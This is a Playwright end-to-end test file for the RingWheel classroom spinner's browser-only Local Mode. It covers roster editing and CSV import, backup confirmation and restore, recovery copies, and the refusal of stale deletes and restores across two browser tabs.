const lp2 = await local.newPage();
lp2.on('pageerror', (err) => localErrors.push(err.message));
await lp.bringToFront();
let realIdbScenarios = 0;

const foreignRequests = () => localRequests.filter((url) => !url.startsWith(app.url) && !/^(data|blob):/.test(url));
const classList = () => lp.getByTestId('class-list').locator('li');
const rosterNames = async () =>
  (await lp.getByTestId('roster-table').count())
    ? lp.getByTestId('roster-table').locator('tbody tr td:first-child input').evaluateAll((inputs) => inputs.map((i) => i.value))
    : [];
const waitNotice = (pattern) => lp.getByTestId('classes-notice').getByText(pattern).waitFor({ timeout: 10000 });

async function downloadFrom(page, trigger) {
  const [download] = await Promise.all([page.waitForEvent('download'), trigger()]);
  return { name: download.suggestedFilename(), text: readFileSync(await download.path(), 'utf8') };
}

const asFile = (name, text, mimeType = 'application/json') => ({ name, mimeType, buffer: Buffer.from(text) });

async function unnamedControls(page) {
  return page.evaluate(() => {
    const problems = [];
    for (const el of document.querySelectorAll('button, a[href]')) {
      if (!(el.textContent || '').trim() && !el.getAttribute('aria-label')) problems.push(el.outerHTML.slice(0, 80));
    }
    for (const el of document.querySelectorAll('input, select, textarea')) {
      const labelled = el.closest('label') || el.getAttribute('aria-label') || (el.id && document.querySelector(`label[for="${el.id}"]`));
      if (!labelled) problems.push(el.outerHTML.slice(0, 80));
    }
    return problems;
  });
}

await step('Local Mode works on first visit with nothing configured', async () => {
  await lp.goto(`${app.url}/`);
  await lp.locator('[data-testid="storage-badge"][data-mode="local"]').waitFor({ timeout: 10000 });
  assert.match(lp.url(), /\/spin$/);
  await lp.locator('[data-testid="api-status"][data-status="ok"][data-mode="local"]').waitFor();
  assert.match(await text(lp, 'api-status'), /Browser storage: working/);
  assert.match(await text(lp, 'storage-badge'), /Local Mode\. Class "My class" is stored in this browser only\./);
  assert.match(await text(lp, 'backup-status'), /No confirmed backup/);
  assert.equal(await lp.getByTestId('api-not-configured').count(), 0);
  assert.equal(await lp.getByTestId('api-note').count(), 0);
  await lp.getByTestId('ring-wheel').waitFor();
  await shot(lp, '11-local-first-visit');
});

await step('Plantae Mercy before any spin records LC with no seed, as it did before consolidation', async () => {
  await lp.getByTestId('mercy-button').click();
  await lp.getByRole('dialog', { name: 'Plantae Mercy' }).getByRole('button', { name: 'Nearctic' }).click();
  const mercy = await readResult(lp);
  assert.deepEqual([mercy.region, mercy.taxon, mercy.iucn], ['Nearctic', 'Plantae', 'LC']);
  const payload = JSON.parse(await lp.getByTestId('debug-payload').textContent());
  assert.equal(payload.seed, '');
  assert.equal(payload.plantae_mercy, true);
  assert.deepEqual(JSON.parse(payload.rule_flags_json), ['plantae_mercy', 'wildcard_iucn']);
});

await step('a spin with no roster is saved in this browser and says so', async () => {
  const result = await spinOnce(lp);
  assert.equal(result.student, 'No student selected');
  await waitForLogStatus(lp, 'logged');
  const panel = await lp.locator('section[aria-labelledby="result-heading"]').innerText();
  assert.match(panel, /Saved in this browser/);
  assert.doesNotMatch(panel, /Saved to the log/);
  await assertWheelPointsAt(lp, { region: result.region, taxon: result.taxon, iucn: result.iucn });
  assert.match(await text(lp, 'backup-status'), /No confirmed backup/);
});

await step('a class can be renamed and students added by hand, with a warning before adding a duplicate', async () => {
  await lp.getByRole('link', { name: 'Classes', exact: true }).click();
  await lp.getByTestId('class-list').waitFor();
  assert.equal(await classList().count(), 1);
  await lp.getByLabel('Rename selected class').fill('Period 3 Ecology');
  await lp.getByRole('button', { name: 'Rename', exact: true }).click();
  await waitNotice(/Class renamed to "Period 3 Ecology"/);

  for (const [name, email] of [['Ada Sample', 'ada.sample@example.com'], ['Ben Placeholder', '']]) {
    await lp.getByLabel('Student name').fill(name);
    await lp.getByLabel('Email (optional)', { exact: true }).fill(email);
    await lp.getByRole('button', { name: 'Add student' }).click();
    await lp.getByTestId('roster-table').getByLabel(`Name of ${name}`).waitFor();
  }
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder']);

  await lp.getByLabel('Student name').fill('ada  sample');
  await lp.getByRole('button', { name: 'Add student' }).click();
  await lp.getByTestId('duplicate-warning').waitFor();
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder'], 'a duplicate was added without confirmation');
  await lp.getByLabel('Student name').fill('');
});

await step('CSV import shows what would change first, skips duplicates and bad rows, and adds only the rest', async () => {
  const csv = [
    'name,email',
    'ADA SAMPLE,',
    'Cy Demo,cy.demo@example.com',
    'cy demo,',
    'Dee Fixture,not-an-email',
    ',nobody@example.com',
    'Eli Testcase,',
  ].join('\n');
  await lp.getByLabel('Or paste the list here').fill(csv);
  await lp.getByRole('button', { name: 'Check the list' }).click();
  const preview = lp.getByTestId('import-preview');
  await preview.waitFor();
  const previewText = await preview.innerText();
  assert.match(previewText, /2 students would be added\.\s+4 would be skipped\./);
  assert.match(previewText, /To add: Cy Demo, Eli Testcase/);
  assert.match(previewText, /Line 2: ADA SAMPLE \(already on the roster\)/);
  assert.match(previewText, /Line 4: cy demo \(listed twice in the file\)/);
  assert.match(previewText, /Line 5: Dee Fixture \(the email address is not valid\)/);
  assert.match(previewText, /Line 6: \(blank\) \(no name\)/);
  // Nothing has been added yet.
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder']);

  await preview.getByRole('button', { name: 'Add 2 students' }).click();
  await waitNotice(/2 students added to "Period 3 Ecology"/);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
  await shot(lp, '12-local-classes');
});

await step('a malformed roster file is rejected and the roster is left alone', async () => {
  const before = await rosterNames();
  for (const [file, pattern] of [
    [asFile('photo.csv', `PK${String.fromCharCode(0)}${String.fromCharCode(3)}not text`, 'text/csv'), /Nothing was imported\. This does not look like a text file\./],
    [asFile('grid.csv', 'Ada,Sample,3\nBen,Placeholder,3', 'text/csv'), /Nothing was imported\. The file has several columns but no header row/],
    [asFile('empty.csv', '\n\n', 'text/csv'), /Nothing was imported\. The file is empty\./],
    [asFile('huge.csv', 'name\n' + 'x'.repeat(1024 * 1024 + 10), 'text/csv'), /Nothing was imported\. The file is larger than 1 MB/],
  ]) {
    await lp.getByTestId('csv-file').setInputFiles(file);
    await waitNotice(pattern);
    assert.equal(await lp.getByTestId('import-preview').count(), 0);
  }
  assert.deepEqual(await rosterNames(), before);
});

await step('a student taken out of the queue stays on the roster but is not spun', async () => {
  await lp.getByLabel('Eli Testcase is in the spin queue').uncheck();
  await lp.getByText('4 students, 3 in the spin queue').waitFor();
  await lp.getByRole('link', { name: 'Back to spinner' }).click();
  await lp.getByTestId('class-select').waitFor();
  await lp.getByRole('button', { name: 'Load Roster' }).click();
  assert.match(await text(lp, 'queue-status'), /Loaded 3 students for "Period 3 Ecology"\. 1 inactive student left out\./);
  assert.deepEqual(await lp.getByTestId('queue').locator('li > span:first-child').allInnerTexts(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo']);
});

let localFirst;
await step('a class spin is saved in this browser with the student, and shows in today\'s list', async () => {
  await lp.getByRole('button', { name: 'Next Spinner' }).click();
  assert.match(await text(lp, 'current-student'), /Ada Sample/);
  localFirst = await spinOnce(lp);
  assert.equal(localFirst.student, 'Ada Sample');
  assert.notEqual(localFirst.taxon, 'Plantae');
  await waitForLogStatus(lp, 'logged');
  await lp.getByRole('heading', { name: 'Today in "Period 3 Ecology"' }).waitFor();
  const rows = lp.getByTestId('logged-spins').locator('tbody tr');
  await lp.getByTestId('logged-spins').getByText('Ada Sample').waitFor();
  assert.equal(await rows.count(), 3);
  // Veto still changes exactly one ring in Local Mode.
  await lp.getByRole('radio', { name: 'IUCN' }).check();
  const before = await lp.getByTestId('debug-payload').textContent();
  await lp.getByTestId('veto-button').click();
  await lp.waitForFunction((prev) => document.querySelector('[data-testid="debug-payload"]')?.textContent !== prev, before);
  const vetoed = await readResult(lp);
  assert.deepEqual([vetoed.region, vetoed.taxon], [localFirst.region, localFirst.taxon]);
  assert.notEqual(vetoed.iucn, localFirst.iucn);
  await waitForLogStatus(lp, 'logged');
  await shot(lp, '13-local-spin');
});

await step('everything is still there after the page is reloaded', async () => {
  await lp.reload();
  await lp.locator('[data-testid="storage-badge"][data-mode="local"]').waitFor({ timeout: 10000 });
  assert.match(await text(lp, 'storage-badge'), /Class "Period 3 Ecology"/);
  await lp.getByTestId('logged-spins').getByText('Ada Sample').first().waitFor();
  assert.equal(await lp.getByTestId('logged-spins').locator('tbody tr').count(), 4);
  await lp.getByRole('button', { name: 'Load Roster' }).click();
  assert.match(await text(lp, 'queue-status'), /Loaded 3 students/);
  await lp.goto(`${app.url}/classes`);
  await lp.getByTestId('roster-table').waitFor();
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
  assert.equal(await lp.getByLabel('Eli Testcase is in the spin queue').isChecked(), false);
  await classList().first().getByText(/4 students, 4 spins\. No confirmed backup\./).waitFor();
});

await step('class settings are saved in this browser and survive a reload', async () => {
  await lp.goto(`${app.url}/admin`);
  await lp.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  assert.equal(await lp.getByLabel('Confetti', { exact: true }).isChecked(), true);
  await lp.getByLabel('Confetti', { exact: true }).uncheck();
  await lp.getByTestId('save-settings').click();
  await lp.getByText('Settings saved in this browser.').waitFor();
  await lp.reload();
  await lp.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  assert.equal(await lp.getByLabel('Confetti', { exact: true }).isChecked(), false);
  assert.match(await text(lp, 'pair-cap-inactive'), /fixed 12% cap/);
});

await step('a second class is completely separate: its own roster, history and settings', async () => {
  await lp.goto(`${app.url}/classes`);
  await lp.getByLabel('New class name').fill('Period 5 Ecology');
  await lp.getByRole('button', { name: 'Add class' }).click();
  await waitNotice(/Class "Period 5 Ecology" created/);
  assert.equal(await classList().count(), 2);
  assert.equal(await lp.getByTestId('roster-table').count(), 0, 'the new class started with students');
  assert.match(await text(lp, 'roster-count'), /0 students/);
  await lp.getByLabel('Student name').fill('Dee Fixture');
  await lp.getByRole('button', { name: 'Add student' }).click();
  await lp.getByTestId('roster-table').getByLabel('Name of Dee Fixture').waitFor();

  await lp.getByRole('link', { name: 'Back to spinner' }).click();
  await lp.getByRole('heading', { name: 'Today in "Period 5 Ecology"' }).waitFor();
  assert.equal(await lp.getByTestId('logged-spins').count(), 0, 'the new class shows another class\'s history');
  await lp.getByRole('button', { name: 'Load Roster' }).click();
  assert.deepEqual(await lp.getByTestId('queue').locator('li > span:first-child').allInnerTexts(), ['Dee Fixture']);
  await lp.getByRole('button', { name: 'Next Spinner' }).click();
  await spinOnce(lp);
  await waitForLogStatus(lp, 'logged');
  await lp.getByTestId('logged-spins').getByText('Dee Fixture').waitFor();
  assert.equal(await lp.getByTestId('logged-spins').locator('tbody tr').count(), 1);

  // The new class has default settings: the first class's change did not leak into it.
  await lp.goto(`${app.url}/admin`);
  await lp.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  assert.equal(await lp.getByLabel('Confetti', { exact: true }).isChecked(), true);

  // Switching back shows the first class exactly as it was left.
  await lp.goto(`${app.url}/spin`);
  await lp.getByTestId('class-select').selectOption({ label: 'Period 3 Ecology' });
  await lp.getByRole('heading', { name: 'Today in "Period 3 Ecology"' }).waitFor();
  await lp.getByTestId('logged-spins').getByText('Ada Sample').first().waitFor();
  assert.equal(await lp.getByTestId('logged-spins').locator('tbody tr').count(), 4);
  assert.equal(await lp.getByTestId('logged-spins').getByText('Dee Fixture').count(), 0);
  assert.equal(await lp.getByTestId('queue').count(), 0, 'the queue carried over from the other class');
});

let backupText;
let backup;
await step('a full backup downloads as a file, and is only recorded as a backup once the teacher confirms they have it', async () => {
  await lp.goto(`${app.url}/classes`);
  await lp.getByTestId('class-list').waitFor();
  const file = await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click());
  assert.match(file.name, /^ringwheel-backup-all-classes-\d{4}-\d{2}-\d{2}\.json$/);
  backupText = file.text;
  backup = JSON.parse(backupText);
  assert.equal(backup.format, 'ringwheel-backup');
  assert.equal(backup.formatVersion, 1);
  assert.deepEqual(backup.workspaces.map((w) => [w.workspace.name, w.workspace.students.length, w.spins.length]), [
    ['Period 3 Ecology', 4, 4],
    ['Period 5 Ecology', 1, 1],
  ]);
  const p3 = backup.workspaces[0];
  assert.deepEqual(p3.workspace.settings, [{ key: 'enableConfetti', value: 'false', notes: '' }]);
  assert.equal(p3.workspace.students.find((s) => s.name === 'Eli Testcase').active, false);
  const adaId = p3.workspace.students.find((s) => s.name === 'Ada Sample').id;
  const adaSpin = p3.spins.find((s) => s.student_name === 'Ada Sample' && !s.veto_used);
  assert.equal(adaSpin.studentId, adaId);
  assert.deepEqual([adaSpin.result_A, adaSpin.result_B, adaSpin.result_C], [localFirst.region, localFirst.taxon, localFirst.iucn]);
  assert.match(adaSpin.seed, /^[0-9a-f]{16}$/);
  // The logged seed still reproduces the logged result in Local Mode.
  const replay = engineSpin({ seed: adaSpin.seed });
  assert.deepEqual([replay.region, replay.taxon, replay.iucn], [adaSpin.result_A, adaSpin.result_B, adaSpin.result_C]);

  // The browser was handed the file. The page cannot know more than that, and must not claim more.
  const confirm = lp.getByTestId('backup-confirm');
  await confirm.waitFor();
  assert.match(await confirm.innerText(), /cannot see whether the browser actually saved it/);
  assert.match(await confirm.innerText(), /Until you do, no backup is recorded/);
  const unconfirmed = async (why) => {
    assert.equal(await lp.getByTestId('class-list').getByText(/Last confirmed backup/).count(), 0, `${why}: a class is shown as backed up`);
    assert.equal(await lp.getByTestId('class-list').getByText(/No confirmed backup/).count(), 2, `${why}: both classes should still say no confirmed backup`);
    assert.match(await text(lp, 'backup-status'), /No confirmed backup/, why);
  };
  await unconfirmed('right after the download started');
  await confirm.scrollIntoViewIfNeeded();
  await shot(lp, '13b-backup-confirm');

  // The teacher says the file did not save (blocked, cancelled, disk full): nothing is recorded.
  await lp.getByTestId('backup-confirm-no').click();
  await waitNotice(/No backup was recorded\. Your classes are unchanged\./);
  assert.equal(await confirm.count(), 0);
  await unconfirmed('after answering that the file did not save');

  // A download the browser refuses outright is reported as a failure and records nothing.
  await lp.evaluate(() => {
    window.__realCreateObjectURL = URL.createObjectURL;
    URL.createObjectURL = () => {
      throw new Error('downloads are blocked in this test');
    };
  });
  await lp.getByRole('button', { name: 'Back up all classes' }).click();
  await waitNotice(/The browser did not accept the download, so no backup was recorded \(downloads are blocked in this test\)/);
  assert.equal(await confirm.count(), 0, 'a failed download still asked for confirmation');
  await unconfirmed('after a download the browser refused');
  await lp.evaluate(() => {
    URL.createObjectURL = window.__realCreateObjectURL;
  });

  // A download that started but was never confirmed is still not a backup after a reload.
  await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click());
  await confirm.waitFor();
  await lp.reload();
  await lp.getByTestId('class-list').getByText(/No confirmed backup/).first().waitFor();
  assert.equal(await confirm.count(), 0);
  await unconfirmed('after reloading with an unanswered download');

  // Only the teacher's own confirmation records it.
  const kept = await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click());
  await confirm.waitFor();
  await lp.getByTestId('backup-confirm-yes').click();
  await waitNotice(/Backup recorded \(2 classes\)\. Keep the file somewhere safe/);
  await lp.getByTestId('class-list').getByText(/Last confirmed backup: today/).first().waitFor();
  assert.equal(await lp.getByTestId('class-list').getByText(/Last confirmed backup: today/).count(), 2);
  assert.match(await text(lp, 'backup-status'), /Last confirmed backup: today/);
  // The time recorded is when the file was built, not when the button was pressed.
  const recorded = await lp.evaluate(
    () =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('ringwheel');
        open.onerror = () => reject(open.error);
        open.onsuccess = () => {
          const all = open.result.transaction('workspaces').objectStore('workspaces').getAll();
          all.onsuccess = () => {
            open.result.close();
            resolve(all.result.map((w) => w.lastBackupAt));
          };
          all.onerror = () => reject(all.error);
        };
      })
  );
  const keptExportedAt = JSON.parse(kept.text).exportedAt;
  assert.deepEqual(recorded, [keptExportedAt, keptExportedAt]);
});

await step('spin history and roster export as ordinary CSV files', async () => {
  const spins = await downloadFrom(lp, () => lp.getByRole('button', { name: 'Spin history as CSV' }).click());
  assert.match(spins.name, /^ringwheel-spins-Period-3-Ecology-.*\.csv$/);
  const lines = spins.text.trim().split('\r\n');
  assert.equal(lines[0], 'timestamp,local_date,local_time,student,email,region,taxon,iucn,plantae_mercy,veto,flags,seed,is_test');
  assert.equal(lines.length, 5);
  assert.ok(lines.some((line) => line.includes(',Ada Sample,ada.sample@example.com,') && line.includes(`,${localFirst.region},${localFirst.taxon},`)));
  const roster = await downloadFrom(lp, () => lp.getByRole('button', { name: 'Roster as CSV' }).click());
  assert.deepEqual(roster.text.trim().split('\r\n'), [
    'name,email,active',
    'Ada Sample,ada.sample@example.com,yes',
    'Ben Placeholder,,yes',
    'Cy Demo,cy.demo@example.com,yes',
    'Eli Testcase,,no',
  ]);
});

await step('a damaged or foreign backup file is rejected and nothing changes', async () => {
  const before = await classList().allInnerTexts();
  const newer = JSON.stringify({ ...backup, formatVersion: 99 });
  const tampered = JSON.parse(backupText);
  tampered.workspaces[0].spins[0].result_B = '';
  for (const [file, pattern] of [
    [asFile('cut-short.json', backupText.slice(0, 500)), /not valid JSON/],
    [asFile('other.json', '{"hello":"world"}'), /not a RingWheel backup file/],
    [asFile('newer.json', newer), /newer version of RingWheel/],
    [asFile('tampered.json', JSON.stringify(tampered)), /spin 1 has an empty result_B/],
    [asFile('notes.txt', 'just some notes', 'text/plain'), /not valid JSON/],
  ]) {
    await lp.getByTestId('restore-file').setInputFiles(file);
    const errors = lp.getByTestId('restore-errors');
    await errors.getByText(pattern).waitFor();
    assert.match(await errors.innerText(), /This file was not restored\. Nothing was changed\./);
    assert.equal(await lp.getByTestId('restore-preview').count(), 0);
  }
  assert.deepEqual(await classList().allInnerTexts(), before);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
});

await step('deleting everything needs a typed confirmation, and then really empties this browser', async () => {
  const button = lp.getByTestId('clear-all');
  assert.ok(await button.isDisabled());
  await lp.getByTestId('clear-confirm').fill('delete');
  assert.ok(await button.isDisabled(), 'lower-case text was accepted as confirmation');
  await lp.getByTestId('clear-confirm').fill('DELETE');
  await button.click();
  await waitNotice(/All RingWheel classes, rosters, history and recovery points were deleted/);
  assert.equal(await classList().count(), 1);
  await classList().first().getByText('My class', { exact: true }).waitFor();
  await classList().first().getByText(/0 students, 0 spins\. No confirmed backup\./).waitFor();
  assert.equal(await lp.getByTestId('roster-table').count(), 0);
  await lp.reload();
  await lp.getByTestId('class-list').waitFor();
  assert.equal(await classList().count(), 1);
});

await step('restoring the backup brings back identical data: a full round trip', async () => {
  await lp.getByTestId('restore-file').setInputFiles(asFile('my-backup.json', backupText));
  const preview = lp.getByTestId('restore-preview');
  await preview.waitFor();
  assert.match(await preview.innerText(), /Period 3 Ecology: 4 students, 4 spins/);
  assert.match(await preview.innerText(), /Period 5 Ecology: 1 students, 1 spins/);
  // Nothing has changed yet. The empty starter class does not count as something to replace.
  assert.equal(await classList().count(), 1);
  assert.equal(await lp.getByTestId('restore-replace').count(), 0);
  assert.doesNotMatch(await preview.innerText(), /already exists/);
  await lp.getByTestId('restore-add').click();
  await waitNotice(/Restore finished\. Added: Period 3 Ecology, Period 5 Ecology\./);
  assert.deepEqual(await classList().locator('label .font-bold').allInnerTexts(), ['Period 3 Ecology', 'Period 5 Ecology']);
  // The rename box follows the restored class. It must not offer the starter class's name back.
  await lp.getByRole('heading', { name: 'Roster for "Period 3 Ecology"' }).waitFor();
  assert.equal(await lp.getByLabel('Rename selected class').inputValue(), 'Period 3 Ecology');
  // The classes came out of a file the teacher is holding, so they count as backed up as of that file.
  await lp.getByTestId('class-list').getByText(/Last confirmed backup: today/).first().waitFor();
  assert.equal(await lp.getByTestId('class-list').getByText(/Last confirmed backup: today/).count(), 2);

  // Every class, student, spin, timestamp, seed and setting is back exactly as it was backed up.
  const again = JSON.parse((await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click())).text);
  const comparable = (file) => file.workspaces.map((w) => ({ ...w, workspace: { ...w.workspace, lastBackupAt: null } }));
  assert.deepEqual(comparable(again), comparable(backup));
  await shot(lp, '14-local-restored');
});

await step('replacing a class from a backup keeps a recovery copy, and the replacement can be undone', async () => {
  await classList().filter({ hasText: 'Period 3 Ecology' }).getByRole('radio').check();
  await lp.getByRole('heading', { name: 'Roster for "Period 3 Ecology"' }).waitFor();
  await lp.getByRole('button', { name: 'Remove Cy Demo' }).click();
  await waitNotice(/Cy Demo was removed from the roster\. Their past spins stay in the history\./);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Eli Testcase']);

  await lp.getByTestId('restore-file').setInputFiles(asFile('my-backup.json', backupText));
  await lp.getByTestId('restore-preview').getByText('Period 3 Ecology: 4 students, 4 spins (this class already exists in this browser)').waitFor();
  await lp.getByTestId('restore-replace').click();
  await waitNotice(/Replaced: Period 3 Ecology, Period 5 Ecology\. The previous version is under Recovery below\./);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
  assert.equal(await classList().count(), 2);

  const recovery = lp.getByTestId('recovery-list').locator('li');
  await recovery.first().waitFor();
  assert.equal(await recovery.count(), 1);
  assert.match(await recovery.first().innerText(), /Before restoring a backup over "Period 3 Ecology", "Period 5 Ecology"/);
  assert.match(await recovery.first().innerText(), /Period 3 Ecology \(3 students, 4 spins\)/);
  await recovery.first().getByRole('button', { name: 'Put it back' }).click();
  await waitNotice(/Restored: Period 3 Ecology, Period 5 Ecology\./);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Eli Testcase']);
});

await step('deleting a class asks first, keeps a recovery copy, and can be undone', async () => {
  const row = classList().filter({ hasText: 'Period 5 Ecology' });
  await row.getByRole('button', { name: 'Delete' }).click();
  assert.equal(await classList().count(), 2, 'the class was deleted without confirmation');
  await row.getByRole('button', { name: 'Yes, delete "Period 5 Ecology"' }).click();
  await waitNotice(/Class "Period 5 Ecology" was deleted\. You can undo this under Recovery below\./);
  assert.equal(await classList().count(), 1);
  const point = lp.getByTestId('recovery-list').locator('li').filter({ hasText: 'Before deleting "Period 5 Ecology"' });
  await point.getByRole('button', { name: 'Put it back' }).click();
  await waitNotice(/Restored: Period 5 Ecology\./);
  assert.equal(await classList().count(), 2);
  await classList().filter({ hasText: 'Period 5 Ecology' }).getByText(/1 student, 1 spin\./).waitFor();
});

await step('two tabs: a spin logged in another tab makes this tab refuse a stale Delete, and nothing is lost', async () => {
  const p3 = () => classList().filter({ hasText: 'Period 3 Ecology' });
  await p3().getByText(/3 students, 4 spins\./).waitFor();
  const recoveryBefore = await lp.getByTestId('recovery-list').locator('li').allInnerTexts();

  // Tab 2: the same browser, the same real IndexedDB. A spin is logged in Period 3.
  await lp2.goto(`${app.url}/spin`);
  await lp2.getByTestId('class-select').waitFor();
  assert.equal(await lp2.getByTestId('class-select').locator('option:checked').innerText(), 'Period 3 Ecology');
  await spinOnce(lp2);
  await waitForLogStatus(lp2, 'logged');

  // Tab 1 has not been touched and still shows 4 spins. Its Delete must not go through.
  assert.match(await p3().innerText(), /3 students, 4 spins\./);
  await p3().getByRole('button', { name: 'Delete' }).click();
  await p3().getByRole('button', { name: 'Yes, delete "Period 3 Ecology"' }).click();
  await waitNotice(/"Period 3 Ecology" changed in another tab or window after this page last showed it\. Nothing was deleted or replaced\./);
  assert.equal(await classList().count(), 2, 'the class was deleted although it had changed in another tab');
  // The page now shows the current version, including the spin from the other tab.
  await p3().getByText(/3 students, 5 spins\./).waitFor();
  // The status line at the top agrees with the class list about the spin from the other tab.
  await lp.getByTestId('backup-status').getByText(/Not in a confirmed backup: 1 spin and roster or settings changes/).waitFor();
  await shot(lp, '14b-stale-delete-refused');
  assert.deepEqual(await lp.getByTestId('recovery-list').locator('li').allInnerTexts(), recoveryBefore, 'a refused delete left a recovery copy');
});

await step('two tabs: a roster edit in another tab makes this tab refuse a stale Replace; the retry keeps the edit in the recovery copy', async () => {
  const p3 = () => classList().filter({ hasText: 'Period 3 Ecology' });
  await lp.getByTestId('restore-file').setInputFiles(asFile('my-backup.json', backupText));
  await lp.getByTestId('restore-preview').getByText('Period 3 Ecology: 4 students, 4 spins (this class already exists in this browser)').waitFor();

  // Tab 2 adds a student while tab 1 is looking at the restore preview.
  await lp2.goto(`${app.url}/classes`);
  await lp2.getByTestId('class-list').waitFor();
  await lp2.getByLabel('Student name').fill('Gus Madeup');
  await lp2.getByRole('button', { name: 'Add student' }).click();
  await lp2.getByTestId('roster-table').getByLabel('Name of Gus Madeup').waitFor();

  const recoveryCount = await lp.getByTestId('recovery-list').locator('li').count();
  await lp.getByTestId('restore-replace').click();
  await waitNotice(/"Period 3 Ecology" changed in another tab or window after this page last showed it\. Nothing was deleted or replaced\./);
  await p3().getByText(/4 students, 5 spins\./).waitFor();
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Eli Testcase', 'Gus Madeup']);
  assert.equal(await lp.getByTestId('recovery-list').locator('li').count(), recoveryCount, 'a refused restore left a recovery copy');

  // Having seen the current version, the teacher goes ahead. The replaced class, new student and new spin included, is kept.
  await lp.getByTestId('restore-replace').click();
  await waitNotice(/Replaced: Period 3 Ecology, Period 5 Ecology\. The previous version is under Recovery below\./);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
  const point = lp.getByTestId('recovery-list').locator('li').filter({ hasText: 'Before restoring a backup over' }).first();
  assert.match(await point.innerText(), /Period 3 Ecology \(4 students, 5 spins\)/);

  // Tab 2 still shows the class as it was before the restore. It cannot edit over the restored version.
  await lp2.getByRole('button', { name: 'Remove Gus Madeup' }).click();
  await lp2.getByTestId('classes-notice').getByText(/This class was changed in another tab or window/).waitFor({ timeout: 10000 });
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Eli Testcase']);
});

await step('two tabs: a spin logged in another tab makes this tab refuse a stale "Put it back"; the retry keeps that spin', async () => {
  const p3 = () => classList().filter({ hasText: 'Period 3 Ecology' });
  await p3().getByText(/4 students, 4 spins\./).waitFor();

  await lp2.goto(`${app.url}/spin`);
  await lp2.getByTestId('class-select').waitFor();
  await spinOnce(lp2);
  await waitForLogStatus(lp2, 'logged');

  const points = lp.getByTestId('recovery-list').locator('li');
  const before = await points.allInnerTexts();
  await points.filter({ hasText: 'Before restoring a backup over' }).first().getByRole('button', { name: 'Put it back' }).click();
  await waitNotice(/"Period 3 Ecology" changed in another tab or window after this page last showed it\. Nothing was deleted or replaced\./);
  // The class still holds the spin from the other tab, and the recovery copy was not used up.
  await p3().getByText(/4 students, 5 spins\./).waitFor();
  assert.deepEqual(await points.allInnerTexts(), before);

  await points.filter({ hasText: 'Before restoring a backup over' }).first().getByRole('button', { name: 'Put it back' }).click();
  await waitNotice(/Restored: Period 3 Ecology, Period 5 Ecology\./);
  assert.deepEqual(await rosterNames(), ['Ada Sample', 'Ben Placeholder', 'Eli Testcase', 'Gus Madeup']);
  await p3().getByText(/4 students, 5 spins\./).waitFor();
  // The version that was just replaced, with the other tab's spin in it, is itself recoverable.
  const undoPoint = points.filter({ hasText: 'Before undoing: restoring a backup over' }).first();
  assert.match(await undoPoint.innerText(), /Period 3 Ecology \(4 students, 5 spins\)/);
});

await step('two tabs: "delete everything" is refused when another tab logged a spin after this tab showed the list', async () => {
  await lp2.goto(`${app.url}/spin`);
  await lp2.getByTestId('class-select').waitFor();
  await spinOnce(lp2);
  await waitForLogStatus(lp2, 'logged');

  await lp.getByTestId('clear-confirm').fill('DELETE');
  await lp.getByTestId('clear-all').click();
  await waitNotice(/Your classes changed in another tab or window after this page last showed them\. Nothing was deleted\./);
  assert.equal(await classList().count(), 2);
  await classList().filter({ hasText: 'Period 3 Ecology' }).getByText(/4 students, 6 spins\./).waitFor();
  await lp.getByTestId('clear-confirm').fill('');
  await lp2.close();
});

await step('the concurrency regressions hold against the real browser IndexedDB, not only the test double', async () => {
  const outcome = await lp.evaluate(async () => {
    const { scenarios } = await import('/tests/local/concurrency-scenarios.ts');
    const { IndexedDbStore } = await import('/src/data/local/idb-store.ts');
    const opened = [];
    const names = [];
    let n = 0;
    // Two separate connections to one real database, as two tabs have.
    const open = async () => {
      const name = `ringwheel-concurrency-check-${Date.now()}-${n++}`;
      names.push(name);
      const a = await IndexedDbStore.open(indexedDB, name);
      const b = await IndexedDbStore.open(indexedDB, name);
      opened.push(a, b);
      return { a, b };
    };
    const results = [];
    for (const scenario of scenarios) {
      try {
        await scenario.run(open);
        results.push({ name: scenario.name, ok: true });
      } catch (err) {
        results.push({ name: scenario.name, ok: false, error: String(err && err.message ? err.message : err) });
      }
    }
    // Leave nothing behind in the browser.
    for (const store of opened) store.close();
    for (const name of names) {
      await new Promise((resolve, reject) => {
        const req = indexedDB.deleteDatabase(name);
        req.onsuccess = resolve;
        req.onerror = () => reject(req.error);
        req.onblocked = () => reject(new Error(`could not remove ${name}`));
      });
    }
    const left = (await indexedDB.databases()).map((db) => db.name);
    return { results, databases: names.length, left, native: /\[native code\]/.test(Function.prototype.toString.call(indexedDB.open)) };
  });
  assert.ok(outcome.native, 'this did not run against the browser\'s own IndexedDB');
  assert.ok(outcome.results.length >= 14, `only ${outcome.results.length} scenarios ran`);
  assert.deepEqual(outcome.results.filter((result) => !result.ok), []);
  assert.ok(outcome.databases >= outcome.results.length);
  assert.deepEqual(outcome.left, ['ringwheel'], 'the check left a database behind or touched the app\'s own');
  realIdbScenarios = outcome.results.length;
});

